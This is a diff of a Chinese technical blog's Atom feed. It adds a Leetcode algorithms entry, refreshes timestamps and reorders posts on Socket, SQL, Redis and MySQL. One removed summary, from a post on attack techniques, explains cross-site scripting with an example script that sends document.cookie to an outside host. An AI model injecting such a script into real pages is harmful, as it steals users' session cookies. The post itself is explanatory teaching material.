@@ -6,7 +6,7 @@
   <link href="/blog/atom.xml" rel="self"/>
   
   <link href="https://sometwo7.github.io/blog/"/>
-  <updated>2019-12-17T08:44:09.267Z</updated>
+  <updated>2020-01-03T07:29:55.633Z</updated>
   <id>https://sometwo7.github.io/blog/</id>
   
   <author>
@@ -17,11 +17,103 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>Leetcode 算法思想</title>
+    <link href="https://sometwo7.github.io/blog/349cf1a4.html"/>
+    <id>https://sometwo7.github.io/blog/349cf1a4.html</id>
+    <published>2020-01-03T09:01:32.000Z</published>
+    <updated>2020-01-03T07:29:55.633Z</updated>
+    
+    <summary type="html">
+    
+      &lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#算法思想&quot;&gt;算法思想&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#二分查找&quot;&gt;二分查找&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#贪心思想&quot;&gt;贪心思想&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#双指针&quot;&gt;双指针&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#排序&quot;&gt;排序&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#快速选择&quot;&gt;快速选择&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#堆排序&quot;&gt;堆排序&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#桶排序&quot;&gt;桶排序&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#搜索&quot;&gt;搜索&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#bfs&quot;&gt;BFS&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#dfs&quot;&gt;DFS&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#backtracking&quot;&gt;Backtracking&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#分治&quot;&gt;分治&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#动态规划&quot;&gt;动态规划&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#分割整数&quot;&gt;分割整数&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#矩阵路径&quot;&gt;矩阵路径&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#斐波那契数列&quot;&gt;斐波那契数列&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#最长递增子序列&quot;&gt;最长递增子序列&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#最长公共子系列&quot;&gt;最长公共子系列&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#0-1-背包&quot;&gt;0-1 背包&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#数组区间&quot;&gt;数组区间&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#字符串编辑&quot;&gt;字符串编辑&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#其它问题&quot;&gt;其它问题&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#数学&quot;&gt;数学&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#素数&quot;&gt;素数&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#最大公约数&quot;&gt;最大公约数&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#进制转换&quot;&gt;进制转换&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#阶乘&quot;&gt;阶乘&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#字符串加法减法&quot;&gt;字符串加法减法&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#相遇问题&quot;&gt;相遇问题&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#多数投票问题&quot;&gt;多数投票问题&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#其它&quot;&gt;其它&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#数据结构相关&quot;&gt;数据结构相关&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#栈和队列&quot;&gt;栈和队列&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#哈希表&quot;&gt;哈希表&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#字符串&quot;&gt;字符串&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#数组与矩阵&quot;&gt;数组与矩阵&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#1-n-分布&quot;&gt;1-n 分布&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#有序矩阵&quot;&gt;有序矩阵&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#链表&quot;&gt;链表&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#树&quot;&gt;树&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#递归&quot;&gt;递归&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#层次遍历&quot;&gt;层次遍历&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#前中后序遍历&quot;&gt;前中后序遍历&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#bst&quot;&gt;BST&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#trie&quot;&gt;Trie&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#图&quot;&gt;图&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#位运算&quot;&gt;位运算&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#参考资料&quot;&gt;参考资料&lt;/a&gt;&lt;!-- GFM-TOC --&gt;
+
+
+&lt;/li&gt;
+&lt;/ul&gt;
+    
+    </summary>
+    
+    
+      <category term="leetcode" scheme="https://sometwo7.github.io/blog/categories/leetcode/"/>
+    
+    
+      <category term="Java" scheme="https://sometwo7.github.io/blog/tags/Java/"/>
+    
+      <category term="leetcode" scheme="https://sometwo7.github.io/blog/tags/leetcode/"/>
+    
+  </entry>
+  
+  <entry>
     <title>JAVA 基础</title>
     <link href="https://sometwo7.github.io/blog/94c303a9.html"/>
     <id>https://sometwo7.github.io/blog/94c303a9.html</id>
     <published>2019-12-17T09:49:19.000Z</published>
-    <updated>2019-12-17T08:44:09.267Z</updated>
+    <updated>2020-01-03T07:29:55.633Z</updated>
     
     <summary type="html">
     
@@ -42,7 +134,7 @@
     <link href="https://sometwo7.github.io/blog/46fcdcd9.html"/>
     <id>https://sometwo7.github.io/blog/46fcdcd9.html</id>
     <published>2019-11-13T16:18:19.000Z</published>
-    <updated>2019-12-17T08:44:09.267Z</updated>
+    <updated>2020-01-03T07:29:55.633Z</updated>
     
     <summary type="html">
     
@@ -70,7 +162,7 @@
     <link href="https://sometwo7.github.io/blog/f889c743.html"/>
     <id>https://sometwo7.github.io/blog/f889c743.html</id>
     <published>2019-11-13T14:08:19.000Z</published>
-    <updated>2019-12-17T08:44:09.267Z</updated>
+    <updated>2020-01-03T07:29:55.633Z</updated>
     
     <summary type="html">
     
@@ -98,7 +190,7 @@
     <link href="https://sometwo7.github.io/blog/eb01ca49.html"/>
     <id>https://sometwo7.github.io/blog/eb01ca49.html</id>
     <published>2019-11-05T10:04:11.000Z</published>
-    <updated>2019-12-17T08:44:09.271Z</updated>
+    <updated>2020-01-03T07:29:55.637Z</updated>
     
     <summary type="html">
     
@@ -123,7 +215,7 @@
     <link href="https://sometwo7.github.io/blog/5b4dafbb.html"/>
     <id>https://sometwo7.github.io/blog/5b4dafbb.html</id>
     <published>2019-11-05T10:03:11.000Z</published>
-    <updated>2019-12-17T08:44:09.267Z</updated>
+    <updated>2020-01-03T07:29:55.637Z</updated>
     
     <summary type="html">
     
@@ -144,197 +236,11 @@
   </entry>
   
   <entry>
-    <title>网络技术 - Socket</title>
-    <link href="https://sometwo7.github.io/blog/ecffdd03.html"/>
-    <id>https://sometwo7.github.io/blog/ecffdd03.html</id>
-    <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-12-17T08:44:09.271Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;一、I-O-模型&quot;&gt;&lt;a href=&quot;#一、I-O-模型&quot; class=&quot;headerlink&quot; title=&quot;一、I/O 模型&quot;&gt;&lt;/a&gt;一、I/O 模型&lt;/h1&gt;&lt;p&gt;一个输入操作通常包括两个阶段：&lt;/p&gt;&lt;ul&gt;
-&lt;li&gt;等待数据准备好&lt;/li&gt;
-&lt;li&gt;从内核向进程复制数据&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;对于一个套接字上的输入操作，第一步通常涉及等待数据从网络中到达。当所等待数据到达时，它被复制到内核中的某个缓冲区。第二步就是把数据从内核缓冲区复制到应用进程缓冲区。&lt;/p&gt;&lt;p&gt;Unix 有五种 I/O 模型：&lt;/p&gt;&lt;ul&gt;
-&lt;li&gt;阻塞式 I/O&lt;/li&gt;
-&lt;li&gt;非阻塞式 I/O&lt;/li&gt;
-&lt;li&gt;I/O 复用（select 和 poll）&lt;/li&gt;
-&lt;li&gt;信号驱动式 I/O（SIGIO）&lt;/li&gt;
-&lt;li&gt;异步 I/O（AIO）&lt;/li&gt;
-&lt;/ul&gt;
-    
-    </summary>
-    
-    
-      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
-    
-    
-      <category term="socket" scheme="https://sometwo7.github.io/blog/tags/socket/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>网络技术 - 攻击技术</title>
-    <link href="https://sometwo7.github.io/blog/877061f8.html"/>
-    <id>https://sometwo7.github.io/blog/877061f8.html</id>
-    <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-12-17T08:44:09.271Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;一、跨站脚本攻击&quot;&gt;&lt;a href=&quot;#一、跨站脚本攻击&quot; class=&quot;headerlink&quot; title=&quot;一、跨站脚本攻击&quot;&gt;&lt;/a&gt;一、跨站脚本攻击&lt;/h1&gt;&lt;h2 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h2&gt;&lt;p&gt;跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。&lt;/p&gt;&lt;h2 id=&quot;攻击原理&quot;&gt;&lt;a href=&quot;#攻击原理&quot; class=&quot;headerlink&quot; title=&quot;攻击原理&quot;&gt;&lt;/a&gt;攻击原理&lt;/h2&gt;&lt;p&gt;例如有一个论坛网站，攻击者可以在上面发布以下内容：&lt;/p&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;javascript&quot;&gt;location.href=&lt;span class=&quot;string&quot;&gt;&quot;//domain.com/?c=&quot;&lt;/span&gt; + &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.cookie&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-    
-    </summary>
-    
-    
-      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
-    
-    
-      <category term="攻击" scheme="https://sometwo7.github.io/blog/tags/%E6%94%BB%E5%87%BB/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>网络技术 - Git</title>
-    <link href="https://sometwo7.github.io/blog/685bfdc8.html"/>
-    <id>https://sometwo7.github.io/blog/685bfdc8.html</id>
-    <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-12-17T08:44:09.267Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;集中式与分布式&quot;&gt;&lt;a href=&quot;#集中式与分布式&quot; class=&quot;headerlink&quot; title=&quot;集中式与分布式&quot;&gt;&lt;/a&gt;集中式与分布式&lt;/h1&gt;&lt;p&gt;Git 属于分布式版本控制系统，而 SVN 属于集中式。&lt;/p&gt;&lt;div align=&quot;center&quot;&gt; &lt;img src=&quot;pics/1fe2dc77-9a2d-4643-90b3-bbf50f649bac.png&quot; width=&quot;600px&quot;&gt; &lt;/div&gt;&lt;br&gt;&lt;p&gt;集中式版本控制只有中心服务器拥有一份代码，而分布式版本控制每个人的电脑上就有一份完整的代码。&lt;/p&gt;&lt;p&gt;集中式版本控制有安全性问题，当中心服务器挂了所有人都没办法工作了。&lt;/p&gt;&lt;p&gt;集中式版本控制需要连网才能工作，如果网速过慢，那么提交一个文件会慢的无法让人忍受。而分布式版本控制不需要连网就能工作。&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
-    
-    
-      <category term="git" scheme="https://sometwo7.github.io/blog/tags/git/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>网络技术 - 面向对象思想</title>
-    <link href="https://sometwo7.github.io/blog/7a9a193e.html"/>
-    <id>https://sometwo7.github.io/blog/7a9a193e.html</id>
-    <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-12-17T08:44:09.271Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;一、三大特性&quot;&gt;&lt;a href=&quot;#一、三大特性&quot; class=&quot;headerlink&quot; title=&quot;一、三大特性&quot;&gt;&lt;/a&gt;一、三大特性&lt;/h1&gt;&lt;h2 id=&quot;封装&quot;&gt;&lt;a href=&quot;#封装&quot; class=&quot;headerlink&quot; title=&quot;封装&quot;&gt;&lt;/a&gt;封装&lt;/h2&gt;&lt;p&gt;利用抽象数据类型将数据和基于数据的操作封装在一起，使其构成一个不可分割的独立实体。数据被保护在抽象数据类型的内部，尽可能地隐藏内部的细节，只保留一些对外的接口使其与外部发生联系。用户无需关心对象内部的细节，但可以通过对象对外提供的接口来访问该对象。&lt;/p&gt;&lt;p&gt;优点：&lt;/p&gt;&lt;ul&gt;
-&lt;li&gt;减少耦合：可以独立地开发、测试、优化、使用、理解和修改&lt;/li&gt;
-&lt;li&gt;减轻维护的负担：可以更容易被程序员理解，并且在调试的时候可以不影响其他模块&lt;/li&gt;
-&lt;li&gt;有效地调节性能：可以通过剖析来确定哪些模块影响了系统的性能&lt;/li&gt;
-&lt;li&gt;提高软件的可重用性&lt;/li&gt;
-&lt;li&gt;降低了构建大型系统的风险：即使整个系统不可用，但是这些独立的模块却有可能是可用的&lt;/li&gt;
-&lt;/ul&gt;
-    
-    </summary>
-    
-    
-      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
-    
-    
-      <category term="对象" scheme="https://sometwo7.github.io/blog/tags/%E5%AF%B9%E8%B1%A1/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>网络技术 - 集群</title>
-    <link href="https://sometwo7.github.io/blog/78b8663.html"/>
-    <id>https://sometwo7.github.io/blog/78b8663.html</id>
-    <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-12-17T08:44:09.271Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;一、负载均衡&quot;&gt;&lt;a href=&quot;#一、负载均衡&quot; class=&quot;headerlink&quot; title=&quot;一、负载均衡&quot;&gt;&lt;/a&gt;一、负载均衡&lt;/h1&gt;&lt;p&gt;集群中的应用服务器（节点）通常被设计成无状态，用户可以请求任何一个节点。&lt;/p&gt;&lt;p&gt;负载均衡器会根据集群中每个节点的负载情况，将用户请求转发到合适的节点上。&lt;/p&gt;&lt;p&gt;负载均衡器可以用来实现高可用以及伸缩性：&lt;/p&gt;&lt;ul&gt;
-&lt;li&gt;高可用：当某个节点故障时，负载均衡器会将用户请求转发到另外的节点上，从而保证所有服务持续可用；&lt;/li&gt;
-&lt;li&gt;伸缩性：根据系统整体负载情况，可以很容易地添加或移除节点。&lt;/li&gt;
-&lt;/ul&gt;
-    
-    </summary>
-    
-    
-      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
-    
-    
-      <category term="集群" scheme="https://sometwo7.github.io/blog/tags/%E9%9B%86%E7%BE%A4/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>网络技术 - SQL</title>
-    <link href="https://sometwo7.github.io/blog/4ce9f201.html"/>
-    <id>https://sometwo7.github.io/blog/4ce9f201.html</id>
-    <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-12-17T08:44:09.271Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;一、基础&quot;&gt;&lt;a href=&quot;#一、基础&quot; class=&quot;headerlink&quot; title=&quot;一、基础&quot;&gt;&lt;/a&gt;一、基础&lt;/h1&gt;&lt;p&gt;模式定义了数据如何存储、存储什么样的数据以及数据如何分解等信息，数据库和表都有模式。&lt;/p&gt;&lt;p&gt;主键的值不允许修改，也不允许复用（不能将已经删除的主键值赋给新数据行的主键）。&lt;/p&gt;&lt;p&gt;SQL（Structured Query Language)，标准 SQL 由 ANSI 标准委员会管理，从而称为 ANSI SQL。各个 DBMS 都有自己的实现，如 PL/SQL、Transact-SQL 等。&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
-    
-    
-      <category term="sql" scheme="https://sometwo7.github.io/blog/tags/sql/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>网络技术 - Redis</title>
-    <link href="https://sometwo7.github.io/blog/2355d11.html"/>
-    <id>https://sometwo7.github.io/blog/2355d11.html</id>
-    <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-12-17T08:44:09.271Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;一、概述&quot;&gt;&lt;a href=&quot;#一、概述&quot; class=&quot;headerlink&quot; title=&quot;一、概述&quot;&gt;&lt;/a&gt;一、概述&lt;/h1&gt;&lt;p&gt;Redis 是速度非常快的非关系型（NoSQL）内存键值数据库，可以存储键和五种不同类型的值之间的映射。&lt;/p&gt;&lt;p&gt;键的类型只能为字符串，值支持五种数据类型：字符串、列表、集合、散列表、有序集合。&lt;/p&gt;&lt;p&gt;Redis 支持很多特性，例如将内存中的数据持久化到硬盘中，使用复制来扩展读性能，使用分片来扩展写性能。&lt;/p&gt;&lt;h1 id=&quot;二、数据类型&quot;&gt;&lt;a href=&quot;#二、数据类型&quot; class=&quot;headerlink&quot; title=&quot;二、数据类型&quot;&gt;&lt;/a&gt;二、数据类型&lt;/h1&gt;
-    
-    </summary>
-    
-    
-      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
-    
-    
-      <category term="redis" scheme="https://sometwo7.github.io/blog/tags/redis/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>网络技术 - MySQL</title>
-    <link href="https://sometwo7.github.io/blog/7a97d7b6.html"/>
-    <id>https://sometwo7.github.io/blog/7a97d7b6.html</id>
-    <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-12-17T08:44:09.271Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;一、索引&quot;&gt;&lt;a href=&quot;#一、索引&quot; class=&quot;headerlink&quot; title=&quot;一、索引&quot;&gt;&lt;/a&gt;一、索引&lt;/h1&gt;&lt;h2 id=&quot;B-Tree-原理&quot;&gt;&lt;a href=&quot;#B-Tree-原理&quot; class=&quot;headerlink&quot; title=&quot;B+ Tree 原理&quot;&gt;&lt;/a&gt;B+ Tree 原理&lt;/h2&gt;&lt;h3 id=&quot;1-数据结构&quot;&gt;&lt;a href=&quot;#1-数据结构&quot; class=&quot;headerlink&quot; title=&quot;1. 数据结构&quot;&gt;&lt;/a&gt;1. 数据结构&lt;/h3&gt;&lt;p&gt;B Tree 指的是 Balance Tree，也就是平衡树。平衡树是一颗查找树，并且所有叶子节点位于同一层。&lt;/p&gt;&lt;p&gt;B+ Tree 是基于 B Tree 和叶子节点顺序访问指针进行实现，它具有 B Tree 的平衡性，并且通过顺序访问指针来提高区间查询的性能。&lt;/p&gt;&lt;p&gt;在 B+ Tree 中，一个节点中的 key 从左到右非递减排列，如果某个指针的左右相邻 key 分别是 key&lt;sub&gt;i&lt;/sub&gt; 和 key&lt;sub&gt;i+1&lt;/sub&gt;，且不为 null，则该指针指向节点的所有 key 大于等于 key&lt;sub&gt;i&lt;/sub&gt; 且小于等于 key&lt;sub&gt;i+1&lt;/sub&gt;。&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
-    
-    
-      <category term="mysql" scheme="https://sometwo7.github.io/blog/tags/mysql/"/>
-    
-  </entry>
-  
-  <entry>
     <title>网络技术 - 缓存</title>
     <link href="https://sometwo7.github.io/blog/64a35ad1.html"/>
     <id>https://sometwo7.github.io/blog/64a35ad1.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-12-17T08:44:09.271Z</updated>
+    <updated>2020-01-03T07:29:55.637Z</updated>
     
     <summary type="html">
     
@@ -362,7 +268,7 @@
     <link href="https://sometwo7.github.io/blog/38ddab86.html"/>
     <id>https://sometwo7.github.io/blog/38ddab86.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-12-17T08:44:09.271Z</updated>
+    <updated>2020-01-03T07:29:55.637Z</updated>
     
     <summary type="html">
     
@@ -383,7 +289,7 @@
     <link href="https://sometwo7.github.io/blog/d350a2b7.html"/>
     <id>https://sometwo7.github.io/blog/d350a2b7.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-12-17T08:44:09.271Z</updated>
+    <updated>2020-01-03T07:29:55.637Z</updated>
     
     <summary type="html">
     
@@ -403,11 +309,74 @@
   </entry>
   
   <entry>
+    <title>网络技术 - SQL</title>
+    <link href="https://sometwo7.github.io/blog/4ce9f201.html"/>
+    <id>https://sometwo7.github.io/blog/4ce9f201.html</id>
+    <published>2019-11-05T10:02:11.000Z</published>
+    <updated>2020-01-03T07:29:55.637Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;一、基础&quot;&gt;&lt;a href=&quot;#一、基础&quot; class=&quot;headerlink&quot; title=&quot;一、基础&quot;&gt;&lt;/a&gt;一、基础&lt;/h1&gt;&lt;p&gt;模式定义了数据如何存储、存储什么样的数据以及数据如何分解等信息，数据库和表都有模式。&lt;/p&gt;&lt;p&gt;主键的值不允许修改，也不允许复用（不能将已经删除的主键值赋给新数据行的主键）。&lt;/p&gt;&lt;p&gt;SQL（Structured Query Language)，标准 SQL 由 ANSI 标准委员会管理，从而称为 ANSI SQL。各个 DBMS 都有自己的实现，如 PL/SQL、Transact-SQL 等。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="sql" scheme="https://sometwo7.github.io/blog/tags/sql/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>网络技术 - Redis</title>
+    <link href="https://sometwo7.github.io/blog/2355d11.html"/>
+    <id>https://sometwo7.github.io/blog/2355d11.html</id>
+    <published>2019-11-05T10:02:11.000Z</published>
+    <updated>2020-01-03T07:29:55.637Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;一、概述&quot;&gt;&lt;a href=&quot;#一、概述&quot; class=&quot;headerlink&quot; title=&quot;一、概述&quot;&gt;&lt;/a&gt;一、概述&lt;/h1&gt;&lt;p&gt;Redis 是速度非常快的非关系型（NoSQL）内存键值数据库，可以存储键和五种不同类型的值之间的映射。&lt;/p&gt;&lt;p&gt;键的类型只能为字符串，值支持五种数据类型：字符串、列表、集合、散列表、有序集合。&lt;/p&gt;&lt;p&gt;Redis 支持很多特性，例如将内存中的数据持久化到硬盘中，使用复制来扩展读性能，使用分片来扩展写性能。&lt;/p&gt;&lt;h1 id=&quot;二、数据类型&quot;&gt;&lt;a href=&quot;#二、数据类型&quot; class=&quot;headerlink&quot; title=&quot;二、数据类型&quot;&gt;&lt;/a&gt;二、数据类型&lt;/h1&gt;
+    
+    </summary>
+    
+    
+      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="redis" scheme="https://sometwo7.github.io/blog/tags/redis/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>网络技术 - MySQL</title>
+    <link href="https://sometwo7.github.io/blog/7a97d7b6.html"/>
+    <id>https://sometwo7.github.io/blog/7a97d7b6.html</id>
+    <published>2019-11-05T10:02:11.000Z</published>
+    <updated>2020-01-03T07:29:55.637Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;一、索引&quot;&gt;&lt;a href=&quot;#一、索引&quot; class=&quot;headerlink&quot; title=&quot;一、索引&quot;&gt;&lt;/a&gt;一、索引&lt;/h1&gt;&lt;h2 id=&quot;B-Tree-原理&quot;&gt;&lt;a href=&quot;#B-Tree-原理&quot; class=&quot;headerlink&quot; title=&quot;B+ Tree 原理&quot;&gt;&lt;/a&gt;B+ Tree 原理&lt;/h2&gt;&lt;h3 id=&quot;1-数据结构&quot;&gt;&lt;a href=&quot;#1-数据结构&quot; class=&quot;headerlink&quot; title=&quot;1. 数据结构&quot;&gt;&lt;/a&gt;1. 数据结构&lt;/h3&gt;&lt;p&gt;B Tree 指的是 Balance Tree，也就是平衡树。平衡树是一颗查找树，并且所有叶子节点位于同一层。&lt;/p&gt;&lt;p&gt;B+ Tree 是基于 B Tree 和叶子节点顺序访问指针进行实现，它具有 B Tree 的平衡性，并且通过顺序访问指针来提高区间查询的性能。&lt;/p&gt;&lt;p&gt;在 B+ Tree 中，一个节点中的 key 从左到右非递减排列，如果某个指针的左右相邻 key 分别是 key&lt;sub&gt;i&lt;/sub&gt; 和 key&lt;sub&gt;i+1&lt;/sub&gt;，且不为 null，则该指针指向节点的所有 key 大于等于 key&lt;sub&gt;i&lt;/sub&gt; 且小于等于 key&lt;sub&gt;i+1&lt;/sub&gt;。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="mysql" scheme="https://sometwo7.github.io/blog/tags/mysql/"/>
+    
+  </entry>
+  
+  <entry>
     <title>网络技术 - 代码可读性</title>
     <link href="https://sometwo7.github.io/blog/1c7cd43d.html"/>
     <id>https://sometwo7.github.io/blog/1c7cd43d.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-12-17T08:44:09.271Z</updated>
+    <updated>2020-01-03T07:29:55.637Z</updated>
     
     <summary type="html">
     
@@ -424,15 +393,24 @@
   </entry>
   
   <entry>
-    <title>网络技术 - 系统设计基础</title>
-    <link href="https://sometwo7.github.io/blog/bf574124.html"/>
-    <id>https://sometwo7.github.io/blog/bf574124.html</id>
+    <title>网络技术 - Socket</title>
+    <link href="https://sometwo7.github.io/blog/ecffdd03.html"/>
+    <id>https://sometwo7.github.io/blog/ecffdd03.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-12-17T08:44:09.271Z</updated>
+    <updated>2020-01-03T07:29:55.637Z</updated>
     
     <summary type="html">
     
